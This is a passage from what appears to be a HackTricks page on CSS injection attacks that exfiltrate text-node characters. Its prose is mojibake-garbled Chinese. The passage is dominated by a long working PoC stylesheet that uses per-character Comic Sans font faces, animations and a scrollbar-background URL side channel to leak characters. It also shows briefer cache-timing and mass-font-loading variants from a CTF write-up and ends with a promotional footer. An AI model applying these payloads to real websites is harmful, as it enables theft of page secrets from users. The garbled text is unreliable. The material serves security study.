å½“**æ‰¾åˆ°å­—ç¬¦**æ—¶ï¼Œå®ƒä¼šè¢«èµ‹äºˆé¢„å®‰è£…çš„**Comic Sanså­—ä½“**ï¼Œè¿™ä¼šä½¿å­—ç¬¦**å˜å¤§**å¹¶**è§¦å‘æ»šåŠ¨æ¡**ï¼Œä»è€Œ**æ³„éœ²æ‰¾åˆ°çš„å­—ç¬¦**ã€‚
{% endhint %}

æ£€æŸ¥ä»PoCä¸­æå–çš„ä»£ç ï¼š
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ï¼ˆIIIï¼‰ï¼šé€šè¿‡éšè—å…ƒç´ ï¼ˆæ— éœ€å¤–éƒ¨èµ„äº§ï¼‰ä½¿ç”¨é»˜è®¤å­—ä½“æ³„æ¼å­—ç¬¦é›†<a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒï¼š** åœ¨[æ­¤ç¯‡æ–‡ç« ä¸­æåˆ°äº†è¿™ä¸ªæ–¹æ³•æœªæˆåŠŸ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

è¿™ç§æƒ…å†µä¸å‰ä¸€ç§æƒ…å†µéå¸¸ç›¸ä¼¼ï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç‰¹å®šå­—ç¬¦**æ¯”å…¶ä»–å­—ç¬¦æ›´å¤§çš„ç›®çš„æ˜¯éšè—æŸäº›å†…å®¹**ï¼Œä¾‹å¦‚ä¸€ä¸ªæŒ‰é’®ï¼Œä»¥å…è¢«æœºå™¨äººæŒ‰ä¸‹ï¼Œæˆ–è€…ä¸€ä¸ªä¸ä¼šè¢«åŠ è½½çš„å›¾åƒã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æµ‹é‡åŠ¨ä½œï¼ˆæˆ–ç¼ºä¹åŠ¨ä½œï¼‰ï¼Œå¹¶çŸ¥é“ç‰¹å®šå­—ç¬¦æ˜¯å¦å­˜åœ¨äºæ–‡æœ¬ä¸­ã€‚

### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ï¼ˆIIIï¼‰ï¼šé€šè¿‡ç¼“å­˜æ—¶é—´æ³„æ¼å­—ç¬¦é›†ï¼ˆæ— éœ€å¤–éƒ¨èµ„äº§ï¼‰<a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒï¼š** åœ¨[æ­¤ç¯‡æ–‡ç« ä¸­æåˆ°äº†è¿™ä¸ªæ–¹æ³•æœªæˆåŠŸ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡ä»ç›¸åŒæ¥æºåŠ è½½å‡å­—ä½“æ¥æ³„æ¼æ–‡æœ¬ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå­—ç¬¦ï¼š
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
å¦‚æœåŒ¹é…æˆåŠŸï¼Œ**å­—ä½“å°†ä»`/static/bootstrap.min.css?q=1`åŠ è½½**ã€‚è™½ç„¶åŠ è½½ä¸ä¼šæˆåŠŸï¼Œ**æµè§ˆå™¨åº”è¯¥ä¼šç¼“å­˜å®ƒ**ï¼Œå³ä½¿æ²¡æœ‰ç¼“å­˜ï¼Œä¹Ÿæœ‰**304æœªä¿®æ”¹**æœºåˆ¶ï¼Œå› æ­¤**å“åº”é€Ÿåº¦åº”è¯¥æ¯”å…¶ä»–å†…å®¹æ›´å¿«**ã€‚

ç„¶è€Œï¼Œå¦‚æœç¼“å­˜å“åº”ä¸éç¼“å­˜å“åº”çš„æ—¶é—´å·®å¼‚ä¸å¤Ÿå¤§ï¼Œè¿™å°†æ²¡æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œä½œè€…æåˆ°ï¼šç„¶è€Œï¼Œåœ¨æµ‹è¯•åï¼Œæˆ‘å‘ç°ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯é€Ÿåº¦å¹¶æ²¡æœ‰å¤ªå¤§å·®å¼‚ï¼Œç¬¬äºŒä¸ªé—®é¢˜æ˜¯æœºå™¨äººä½¿ç”¨äº†`disk-cache-size=1`æ ‡å¿—ï¼Œè¿™çœŸçš„å¾ˆå‘¨åˆ°ã€‚

### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ï¼ˆIIIï¼‰ï¼šé€šè¿‡è®¡æ—¶åŠ è½½æ•°ç™¾ä¸ªæœ¬åœ°â€œå­—ä½“â€ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„äº§ï¼‰æ³„æ¼å­—ç¬¦é›†<a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒï¼š** è¿™åœ¨[æ­¤è§£å†³æ–¹æ¡ˆçš„å†™ä½œä¸­è¢«æåŠä¸ºä¸€ä¸ªä¸æˆåŠŸçš„è§£å†³æ–¹æ¡ˆ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“åŒ¹é…å‘ç”Ÿæ—¶ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤º**CSSä»åŒä¸€æºåŠ è½½æ•°ç™¾ä¸ªè™šå‡å­—ä½“**ã€‚è¿™æ ·ï¼Œæ‚¨å¯ä»¥**æµ‹é‡æ‰€éœ€çš„æ—¶é—´**ï¼Œå¹¶æ‰¾å‡ºå­—ç¬¦æ˜¯å¦å‡ºç°ï¼Œä¾‹å¦‚ï¼š
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
è€Œæœºå™¨äººçš„ä»£ç å¦‚ä¸‹ï¼š
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
å¦‚æœå­—ä½“ä¸åŒ¹é…ï¼Œåˆ™è®¿é—®æœºå™¨äººæ—¶çš„å“åº”æ—¶é—´é¢„è®¡çº¦ä¸º30ç§’ã€‚ç„¶è€Œï¼Œå¦‚æœå­˜åœ¨å­—ä½“åŒ¹é…ï¼Œå°†å‘é€å¤šä¸ªè¯·æ±‚ä»¥æ£€ç´¢å­—ä½“ï¼Œå¯¼è‡´ç½‘ç»œæŒç»­æ´»åŠ¨ã€‚å› æ­¤ï¼Œå°†éœ€è¦æ›´é•¿çš„æ—¶é—´æ¥æ»¡è¶³åœæ­¢æ¡ä»¶å¹¶æ¥æ”¶å“åº”ã€‚å› æ­¤ï¼Œå“åº”æ—¶é—´å¯ä»¥ç”¨ä½œæŒ‡æ ‡æ¥ç¡®å®šæ˜¯å¦å­˜åœ¨å­—ä½“åŒ¹é…ã€‚

## å‚è€ƒèµ„æ–™

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** ä¸Š**å…³æ³¨æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
